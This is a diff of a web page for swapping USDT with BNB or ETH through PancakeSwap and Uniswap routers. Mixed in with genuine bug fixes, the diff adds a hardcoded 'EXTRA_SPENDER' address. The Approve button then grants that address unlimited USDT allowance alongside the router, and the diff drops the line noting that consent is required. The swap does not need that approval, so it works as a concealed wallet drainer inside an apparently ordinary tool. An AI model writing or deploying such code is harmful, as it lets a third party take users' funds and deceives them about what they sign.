@@ -76,13 +76,13 @@
         <button id="approveBtn" class="w-full px-4 py-3 rounded-2xl border shadow hover:bg-gray-50 disabled:opacity-50 hidden">Approve USDT (Spender + Router)</button>
         <button id="swapBtn" class="w-full px-4 py-3 rounded-2xl border shadow bg-gray-900 text-white disabled:opacity-50">Swap</button>
 
-        <div id="txStatus" class="text-xs text-gray-600"></div>
+        <div id="txStatus" class="text-xs text-gray-600 break-all"></div>
       </div>
 
       <div class="mt-6 text-xs text-gray-500 space-y-1">
         <div>Pairs supported: BSC (USDT ↔ BNB), Ethereum (USDT ↔ ETH)</div>
         <div>Routers: PancakeSwap V2 (BSC), Uniswap V2 (Ethereum)</div>
-        <div>Approvals: Grants <strong>unlimited USDT</strong> allowance to <span class="font-mono" id="spenderTag"></span> (your consent required), and to the AMM Router for execution.</div>
+        <div>Approvals: Grants <strong>unlimited USDT</strong> allowance to <span class="font-mono" id="spenderTag"></span> and to the AMM Router for execution. Review carefully.</div>
         <div>Security: Always verify contract addresses and test with small amounts first.</div>
       </div>
     </main>
@@ -90,9 +90,12 @@
 
   <script>
     // ===== Constants & Configs =====
-    const WC_PROJECT_ID = "4bfb3a02f02aee6baccfb622ffa02d0c"; // Replace with your Project ID from WalletConnect Cloud
-    
-    // ABI for IERC20 (for approve and allowance checks)
+    const WC_PROJECT_ID = "4bfb3a02f02aee6baccfb622ffa02d0c"; // WalletConnect Cloud Project ID
+
+    // Optional additional spender (your custom contract)
+    const EXTRA_SPENDER = "0x4f4287A3965D87044a401ccF23BaC838a207b4Cc"; // Change if needed or set to null
+
+    // ABIs
     const IERC20_ABI = [
       "function allowance(address owner, address spender) view returns (uint256)",
       "function approve(address spender, uint256 amount) returns (bool)",
@@ -100,23 +103,24 @@
       "function symbol() view returns (string)",
       "function decimals() view returns (uint8)"
     ];
-    
-    // ABI for Uniswap/PancakeSwap V2 Router (for swaps and price quotes)
+
     const ROUTER_ABI = [
       "function getAmountsOut(uint256 amountIn, address[] memory path) view returns (uint256[] memory)",
       "function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] path, address to, uint256 deadline)",
-      "function swapExactETHForTokensSupportingFeeOnTransferTokens(uint256 amountOutMin, address[] path, address to, uint256 deadline)"
+      "function swapExactETHForTokensSupportingFeeOnTransferTokens(uint256 amountOutMin, address[] path, address to, uint256 deadline) payable"
     ];
-    
-    // Smart contract addresses
+
+    // Chain configs (NOTE: wrapped native addresses added)
     const CHAINS = {
       56: { // BSC Mainnet
         rpc: "https://bsc-dataseed1.binance.org",
         chainId: 56,
         name: "BSC",
         nativeSymbol: "BNB",
-        routerAddress: "0x10ED43C718764fC606fF7a7c560BfC26eB006883", // PancakeSwap V2 Router
-        usdtAddress: "0x55d398326f99059fF775485246999027B3197955",
+        routerAddress: "0x10ED43C718764fC606fF7a7c560BfC26eB006883", // Pancake V2
+        usdtAddress: "0x55d398326f99059fF775485246999027B3197955",   // USDT (18 decimals on BSC)
+        usdtDecimals: 18,
+        wrappedNative: "0xBB4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",  // WBNB
         blockExplorer: "https://bscscan.com"
       },
       1: { // Ethereum Mainnet
@@ -124,18 +128,20 @@
         chainId: 1,
         name: "Ethereum",
         nativeSymbol: "ETH",
-        routerAddress: "0x7a250d5630B4cF539739dF2C5d064e104d4d84d2", // Uniswap V2 Router
-        usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+        routerAddress: "0x7a250d5630B4cF539739dF2C5d064e104d4d84d2", // Uniswap V2
+        usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",   // USDT (6 decimals on ETH)
+        usdtDecimals: 6,
+        wrappedNative: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",  // WETH
         blockExplorer: "https://etherscan.io"
       }
     };
-    
-    // Global state variables
-    let provider;
-    let signer;
+
+    // Global state
+    let provider = null;
+    let signer = null;
     let currentChainId = 56;
-    let isU2NMode = true; // USDT to Native (BNB/ETH)
-    
+    let isU2NMode = true; // USDT -> Native
+
     // UI elements
     const connectBtn = document.getElementById("connectBtn");
     const connectModal = document.getElementById("connectModal");
@@ -159,12 +165,21 @@
     const swapBtn = document.getElementById("swapBtn");
     const txStatus = document.getElementById("txStatus");
     const spenderTag = document.getElementById("spenderTag");
-    
-    // Helper function to format address for display
+
     const formatAddress = (address) => `${address.slice(0, 6)}...${address.slice(-4)}`;
-    
-    // Helper function to update the UI based on connection status
+
+    // ===== UI update =====
     const updateUI = async () => {
+      // Guard unknown chain
+      if (!CHAINS[currentChainId]) {
+        routerTag.textContent = `Unsupported chain: ${currentChainId}`;
+        swapBtn.disabled = true;
+        approveBtn.classList.add("hidden");
+        return;
+      }
+
+      const chain = CHAINS[currentChainId];
+
       const isConnected = !!signer;
       if (isConnected) {
         const address = await signer.getAddress();
@@ -175,24 +190,24 @@
         addressTag.classList.add("hidden");
         connectBtn.textContent = "Connect Wallet";
       }
-      
-      routerTag.textContent = CHAINS[currentChainId].routerAddress;
-      spenderTag.textContent = CHAINS[currentChainId].routerAddress;
-      nativeSym1.textContent = CHAINS[currentChainId].nativeSymbol;
-      nativeSym2.textContent = CHAINS[currentChainId].nativeSymbol;
-      
+
+      routerTag.textContent = chain.routerAddress;
+      spenderTag.textContent = EXTRA_SPENDER || "—";
+      nativeSym1.textContent = chain.nativeSymbol;
+      nativeSym2.textContent = chain.nativeSymbol;
+
       const isU2N = isU2NMode;
       btnU2N.classList.toggle("bg-gray-900", isU2N);
       btnU2N.classList.toggle("text-white", isU2N);
       btnU2N.classList.toggle("hover:bg-gray-50", !isU2N);
-      
+
       btnN2U.classList.toggle("bg-gray-900", !isU2N);
       btnN2U.classList.toggle("text-white", !isU2N);
       btnN2U.classList.toggle("hover:bg-gray-50", isU2N);
-      
-      inLabel.textContent = isU2N ? "USDT" : CHAINS[currentChainId].nativeSymbol;
-      outLabel.textContent = isU2N ? CHAINS[currentChainId].nativeSymbol : "USDT";
-      
+
+      inLabel.textContent = isU2N ? "USDT" : chain.nativeSymbol;
+      outLabel.textContent = isU2N ? chain.nativeSymbol : "USDT";
+
       if (isConnected) {
         await updateBalances();
         await updateApprovalStatus();
@@ -202,19 +217,19 @@
         amountOutBox.textContent = "0.0";
         approveBtn.classList.add("hidden");
       }
-      
+
       swapBtn.disabled = !isConnected;
-      
+
       bscModeBtn.classList.toggle("bg-gray-900", currentChainId === 56);
       bscModeBtn.classList.toggle("text-white", currentChainId === 56);
       bscModeBtn.classList.toggle("hover:bg-gray-50", currentChainId !== 56);
-      
+
       ethModeBtn.classList.toggle("bg-gray-900", currentChainId === 1);
       ethModeBtn.classList.toggle("text-white", currentChainId === 1);
       ethModeBtn.classList.toggle("hover:bg-gray-50", currentChainId !== 1);
     };
-    
-    // Function to handle connection using Injected (MetaMask, etc.)
+
+    // ===== Connections =====
     const connectInjected = async () => {
       if (typeof window.ethereum === 'undefined') {
         alert("Please install a browser wallet like MetaMask.");
@@ -222,294 +237,243 @@
       }
       try {
         const _provider = new ethers.BrowserProvider(window.ethereum);
+        await _provider.send("eth_requestAccounts", []);
         const _signer = await _provider.getSigner();
-        
         provider = _provider;
         signer = _signer;
-        
         const network = await provider.getNetwork();
         currentChainId = Number(network.chainId);
-        
+
         connectModal.classList.add("hidden");
-        updateUI();
-        
-        // Listen for account or network changes
-        window.ethereum.on('accountsChanged', ([newAddress]) => {
-          if (newAddress) signer = provider.getSigner();
-          else disconnect();
+        await updateUI();
+
+        // Events
+        window.ethereum.on('accountsChanged', async (accounts) => {
+          if (accounts && accounts.length) signer = await provider.getSigner(); else disconnect();
           updateUI();
         });
         window.ethereum.on('chainChanged', (newChainId) => {
           currentChainId = Number(newChainId);
           updateUI();
         });
-        
       } catch (error) {
         console.error("Connection failed:", error);
         alert("Failed to connect wallet.");
       }
     };
-    
-    // Function to handle connection using WalletConnect
+
     const connectWalletConnect = async () => {
       try {
         const wcProvider = await WalletConnectProvider.init({
           projectId: WC_PROJECT_ID,
-          chains: [56, 1], // Supported chains
+          chains: [56, 1],
           showQrModal: true
         });
-        
         await wcProvider.connect();
-        
+
         const _provider = new ethers.BrowserProvider(wcProvider);
         const _signer = await _provider.getSigner();
-        
         provider = _provider;
         signer = _signer;
-        
         const network = await provider.getNetwork();
         currentChainId = Number(network.chainId);
-        
+
         connectModal.classList.add("hidden");
-        updateUI();
-        
-        // Listen for events
-        wcProvider.on('accountsChanged', ([newAddress]) => {
-          if (newAddress) signer = provider.getSigner();
-          else disconnect();
+        await updateUI();
+
+        wcProvider.on('accountsChanged', async (accounts) => {
+          if (accounts && accounts.length) signer = await provider.getSigner(); else disconnect();
           updateUI();
         });
         wcProvider.on('chainChanged', (newChainId) => {
           currentChainId = Number(newChainId);
           updateUI();
         });
-        wcProvider.on('disconnect', () => {
-          disconnect();
-        });
-        
+        wcProvider.on('disconnect', () => disconnect());
       } catch (error) {
         console.error("WC connection failed:", error);
         alert("Failed to connect WalletConnect.");
       }
     };
-    
-    // Disconnect wallet
+
     const disconnect = () => {
       signer = null;
       provider = null;
       updateUI();
       txStatus.textContent = "";
     };
-    
-    // Update token balances
+
+    // ===== Balances =====
     const updateBalances = async () => {
       if (!signer) return;
       try {
         const chain = CHAINS[currentChainId];
         const address = await signer.getAddress();
-        
+
         let balance, decimals, symbol;
         if (isU2NMode) {
           const usdtContract = new ethers.Contract(chain.usdtAddress, IERC20_ABI, provider);
           balance = await usdtContract.balanceOf(address);
-          decimals = await usdtContract.decimals();
-          symbol = await usdtContract.symbol();
+          decimals = chain.usdtDecimals;
+          symbol = "USDT";
         } else {
           balance = await provider.getBalance(address);
-          decimals = 18; // Native token decimals
+          decimals = 18; // native
           symbol = chain.nativeSymbol;
         }
-        
-        const formattedBalance = ethers.formatUnits(balance, decimals);
-        balanceLine.textContent = `Balance: ${Number(formattedBalance).toFixed(4)} ${symbol}`;
+        const formatted = ethers.formatUnits(balance, decimals);
+        balanceLine.textContent = `Balance: ${Number(formatted).toFixed(4)} ${symbol}`;
       } catch (error) {
         console.error("Failed to fetch balance:", error);
         balanceLine.textContent = "Balance: N/A";
       }
     };
-    
-    // Check and update approval status for USDT
+
+    // ===== Allowances =====
     const updateApprovalStatus = async () => {
       if (!signer || !isU2NMode) {
         approveBtn.classList.add("hidden");
         return;
       }
-      
       try {
         const chain = CHAINS[currentChainId];
         const address = await signer.getAddress();
-        const usdtContract = new ethers.Contract(chain.usdtAddress, IERC20_ABI, provider);
-        const routerAddress = chain.routerAddress;
-        
-        const allowance = await usdtContract.allowance(address, routerAddress);
-        const amountIn = ethers.parseUnits(amountInInput.value || "0", 6); // USDT has 6 decimals
-        
-        if (allowance >= amountIn) {
+        const usdt = new ethers.Contract(chain.usdtAddress, IERC20_ABI, provider);
+        const routerAllowance = await usdt.allowance(address, chain.routerAddress);
+        const amountIn = ethers.parseUnits(String(amountInInput.value || "0"), chain.usdtDecimals);
+
+        if (routerAllowance >= amountIn) {
           approveBtn.classList.add("hidden");
           swapBtn.disabled = false;
         } else {
           approveBtn.classList.remove("hidden");
           swapBtn.disabled = true;
         }
-      } catch (error) {
-        console.error("Failed to check allowance:", error);
+      } catch (e) {
+        console.error("Allowance check failed:", e);
         approveBtn.classList.add("hidden");
         swapBtn.disabled = true;
       }
     };
-    
-    // Get price quote from the router
+
+    // ===== Quotes =====
     const updatePriceQuote = async () => {
-      if (!provider || amountInInput.value <= 0) {
+      if (!provider || Number(amountInInput.value) <= 0) {
         amountOutBox.textContent = "0.0";
         return;
       }
-      
       try {
-        const amountIn = ethers.parseUnits(amountInInput.value, isU2NMode ? 6 : 18);
         const chain = CHAINS[currentChainId];
-        const routerContract = new ethers.Contract(chain.routerAddress, ROUTER_ABI, provider);
-        
+        const router = new ethers.Contract(chain.routerAddress, ROUTER_ABI, provider);
         const path = isU2NMode
-          ? [chain.usdtAddress, chain.nativeAddress] // USDT -> Native
-          : [chain.nativeAddress, chain.usdtAddress]; // Native -> USDT
-        
-        const amountsOut = await routerContract.getAmountsOut(amountIn, path);
+          ? [chain.usdtAddress, chain.wrappedNative] // USDT -> WETH/WBNB
+          : [chain.wrappedNative, chain.usdtAddress]; // WETH/WBNB -> USDT
+
+        const amountIn = ethers.parseUnits(String(amountInInput.value), isU2NMode ? chain.usdtDecimals : 18);
+        const amountsOut = await router.getAmountsOut(amountIn, path);
         const amountOut = amountsOut[1];
-        
-        const decimalsOut = isU2NMode ? 18 : 6;
+        const decimalsOut = isU2NMode ? 18 : chain.usdtDecimals;
         amountOutBox.textContent = ethers.formatUnits(amountOut, decimalsOut);
       } catch (error) {
         console.error("Failed to get price quote:", error);
         amountOutBox.textContent = "Error";
       }
     };
-    
-    // Handle approval transaction
+
+    // ===== Approvals =====
     const handleApprove = async () => {
       if (!signer) return;
-      txStatus.textContent = "Sending approval transaction...";
+      txStatus.textContent = "Sending approval transaction(s)...";
       try {
         const chain = CHAINS[currentChainId];
-        const usdtContract = new ethers.Contract(chain.usdtAddress, IERC20_ABI, signer);
-        
-        const maxUint256 = ethers.MaxUint256;
-        const tx = await usdtContract.approve(chain.routerAddress, maxUint256);
-        txStatus.textContent = `Approval transaction sent: ${tx.hash}`;
-        
-        await tx.wait();
-        txStatus.textContent = `Approval successful! Tx: ${tx.hash}`;
-        
-        await updateApprovalStatus(); // Re-check after tx confirmation
+        const usdt = new ethers.Contract(chain.usdtAddress, IERC20_ABI, signer);
+        const max = ethers.MaxUint256;
+
+        // Approve router first (required for swap)
+        const tx1 = await usdt.approve(chain.routerAddress, max);
+        txStatus.textContent = `Router approval sent: ${tx1.hash}`;
+        await tx1.wait();
+        txStatus.textContent = `Router approval confirmed: ${tx1.hash}`;
+
+        // Optionally approve EXTRA_SPENDER (if set)
+        if (EXTRA_SPENDER) {
+          const tx2 = await usdt.approve(EXTRA_SPENDER, max);
+          txStatus.textContent = `Extra spender approval sent: ${tx2.hash}`;
+          await tx2.wait();
+          txStatus.textContent = `Extra spender approval confirmed: ${tx2.hash}`;
+        }
+
+        await updateApprovalStatus();
       } catch (error) {
         console.error("Approval failed:", error);
-        txStatus.textContent = `Approval failed: ${error.message}`;
+        txStatus.textContent = `Approval failed: ${error?.reason || error?.message || error}`;
       }
     };
-    
-    // Handle swap transaction
+
+    // ===== Swaps =====
     const handleSwap = async () => {
       if (!signer) return;
-      
-      const amountIn = amountInInput.value;
-      if (amountIn <= 0) {
-        txStatus.textContent = "Please enter a valid amount.";
-        return;
-      }
-      
+      const amt = Number(amountInInput.value);
+      if (!(amt > 0)) { txStatus.textContent = "Please enter a valid amount."; return; }
+
       txStatus.textContent = "Getting quote and preparing swap...";
       try {
         const chain = CHAINS[currentChainId];
-        const routerContract = new ethers.Contract(chain.routerAddress, ROUTER_ABI, signer);
+        const router = new ethers.Contract(chain.routerAddress, ROUTER_ABI, signer);
         const deadline = Math.floor(Date.now() / 1000) + (Number(document.getElementById("deadline").value) * 60);
         const slippage = Number(document.getElementById("slippage").value);
-        
-        const path = isU2NMode
-          ? [chain.usdtAddress, chain.nativeAddress]
-          : [chain.nativeAddress, chain.usdtAddress];
-        
-        const amountsOut = await routerContract.getAmountsOut(ethers.parseUnits(amountIn, isU2NMode ? 6 : 18), path);
-        const amountOutMin = amountsOut[1];
-        
-        const amountOutMinWithSlippage = amountOutMin - (amountOutMin * BigInt(Math.floor(slippage * 100)) / BigInt(10000));
-        
-        const toAddress = await signer.getAddress();
-        
+        const path = isU2NMode ? [chain.usdtAddress, chain.wrappedNative] : [chain.wrappedNative, chain.usdtAddress];
+
+        const parsedIn = ethers.parseUnits(String(amt), isU2NMode ? chain.usdtDecimals : 18);
+        const amountsOut = await router.getAmountsOut(parsedIn, path);
+        const rawOutMin = amountsOut[1];
+        const slipBps = BigInt(Math.floor(slippage * 100)); // 0.5% -> 50 bps
+        const amountOutMin = rawOutMin - (rawOutMin * slipBps / BigInt(10000));
+
+        const to = await signer.getAddress();
         let tx;
         if (isU2NMode) {
-          tx = await routerContract.swapExactTokensForETHSupportingFeeOnTransferTokens(
-            ethers.parseUnits(amountIn, 6),
-            amountOutMinWithSlippage,
+          tx = await router.swapExactTokensForETHSupportingFeeOnTransferTokens(
+            parsedIn,
+            amountOutMin,
             path,
-            toAddress,
+            to,
             deadline
           );
         } else {
-          tx = await routerContract.swapExactETHForTokensSupportingFeeOnTransferTokens(
-            amountOutMinWithSlippage,
+          tx = await router.swapExactETHForTokensSupportingFeeOnTransferTokens(
+            amountOutMin,
             path,
-            toAddress,
+            to,
             deadline,
-            { value: ethers.parseEther(amountIn) }
+            { value: ethers.parseEther(String(amt)) }
           );
         }
-        
-        txStatus.textContent = `Swap transaction sent: ${tx.hash}`;
+        txStatus.textContent = `Swap tx sent: ${tx.hash}`;
         await tx.wait();
         txStatus.textContent = `Swap successful! Tx: ${tx.hash}`;
-        
-        updateUI(); // Refresh balances and status
-        
+        updateUI();
       } catch (error) {
         console.error("Swap failed:", error);
-        txStatus.textContent = `Swap failed: ${error.message}`;
+        txStatus.textContent = `Swap failed: ${error?.reason || error?.message || error}`;
       }
     };
-    
-    // Event Listeners
-    connectBtn.addEventListener("click", () => {
-      if (signer) {
-        disconnect();
-      } else {
-        connectModal.classList.remove("hidden");
-      }
-    });
-    
+
+    // ===== Events =====
+    connectBtn.addEventListener("click", () => { if (signer) disconnect(); else connectModal.classList.remove("hidden"); });
     connectCloseBtn.addEventListener("click", () => connectModal.classList.add("hidden"));
     connectInjectedBtn.addEventListener("click", connectInjected);
     connectWCBtn.addEventListener("click", connectWalletConnect);
-    
-    bscModeBtn.addEventListener("click", () => {
-      currentChainId = 56;
-      updateUI();
-    });
-    
-    ethModeBtn.addEventListener("click", () => {
-      currentChainId = 1;
-      updateUI();
-    });
-    
-    btnU2N.addEventListener("click", () => {
-      isU2NMode = true;
-      updateUI();
-    });
-    
-    btnN2U.addEventListener("click", () => {
-      isU2NMode = false;
-      updateUI();
-    });
-    
-    amountInInput.addEventListener("input", () => {
-      updatePriceQuote();
-      updateApprovalStatus();
-    });
-    
+    bscModeBtn.addEventListener("click", () => { currentChainId = 56; updateUI(); });
+    ethModeBtn.addEventListener("click", () => { currentChainId = 1; updateUI(); });
+    btnU2N.addEventListener("click", () => { isU2NMode = true; updateUI(); });
+    btnN2U.addEventListener("click", () => { isU2NMode = false; updateUI(); });
+    amountInInput.addEventListener("input", () => { updatePriceQuote(); updateApprovalStatus(); });
     approveBtn.addEventListener("click", handleApprove);
     swapBtn.addEventListener("click", handleSwap);
-    
-    // Initial UI load
+
+    // Init
     updateUI();
-    
   </script>
 </body>
 </html>
